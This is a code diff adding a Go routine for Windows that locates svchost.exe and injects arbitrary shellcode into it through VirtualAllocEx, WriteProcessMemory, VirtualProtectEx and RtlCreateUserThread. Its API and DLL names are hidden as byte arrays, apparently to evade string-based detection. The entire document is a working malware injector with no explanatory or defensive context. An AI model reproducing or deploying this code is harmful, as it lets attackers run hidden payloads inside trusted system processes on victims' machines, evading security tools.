@@ -1,0 +1,87 @@
+func findProcess(proc string) int {
+    processList, err := ps.Processes()
+    if err != nil {
+        return -1
+    }
+
+    for x := range processList {
+        var process ps.Process
+        process = processList[x]
+        if process.Executable() != proc {
+            continue
+        }
+        p, errOpenProcess := windows.OpenProcess(
+        	windows.PROCESS_VM_OPERATION, false, uint32(process.Pid()))
+        if errOpenProcess != nil {
+        	continue
+        }
+        windows.CloseHandle(p)
+        return process.Pid()
+    }
+    return 0
+}
+
+func run(shellcode []byte) {
+
+    const (
+        PROCESS_CREATE_THREAD       = 0x0002
+        PROCESS_VM_OPERATION        = 0x0008
+        PROCESS_VM_WRITE            = 0x0020
+        PROCESS_VM_READ             = 0x0010
+        PROCESS_QUERY_INFORMATION   = 0x00000400
+
+        MEM_COMMIT                  = 0x1000
+        MEM_RESERVE                 = 0x2000
+        PAGE_READWRITE              = 0x04
+        PAGE_EXECUTE_READ           = 0x20
+    )
+
+    pid := findProcess("svchost.exe")
+	fmt.Printf("[*] Injecting into svchost.exe, PID=[%d]\n", pid)
+	if pid == 0 {
+		panic("Cannot find svchost.exe process")
+	}
+
+	kernel32 := windows.NewLazySystemDLL(string([]byte{'k','e','r','n','e','l','3','2','.','d','l','l'}))
+	ntdll := windows.NewLazySystemDLL(string([]byte{'n','t','d','l','l','.','d','l','l'}))
+
+	OpenProcess := kernel32.NewProc(string([]byte{'O','p','e','n','P','r','o','c','e','s','s'}))
+	VirtualAllocEx := kernel32.NewProc(string([]byte{'V','i','r','t','u','a','l','A','l','l','o','c','E','x'}))
+	VirtualProtectEx := kernel32.NewProc(string([]byte{'V','i','r','t','u','a','l','P','r','o','t','e','c','t','E','x'}))
+	WriteProcessMemory := kernel32.NewProc(string([]byte{'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y'}))
+	RtlCreateUserThread := ntdll.NewProc(string([]byte{'R','t','l','C','r','e','a','t','e','U','s','e','r','T','h','r','e','a','d'}))
+	CloseHandle := kernel32.NewProc(string([]byte{'C','l','o','s','e','H','a','n','d','l','e'}))
+
+
+	pHandle, _, errOpenProcess := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, 0, uintptr(uint32(pid)))
+    if errOpenProcess != nil && errOpenProcess.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
+	}
+
+	addr, _, errVirtualAlloc:= VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
+	}
+	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
+	}
+
+	oldProtect := PAGE_READWRITE
+	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
+	}
+
+	var tHandle uintptr
+	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
+	if errRtlCreateUserThread != nil && errRtlCreateUserThread.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling RtlCreateUserThread:\r\n%s", errRtlCreateUserThread.Error()))
+	}
+
+	_, _, errCloseHandle := CloseHandle.Call(uintptr(uint32(pHandle)))
+	if errCloseHandle != nil && errCloseHandle.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
+	}
+
+}
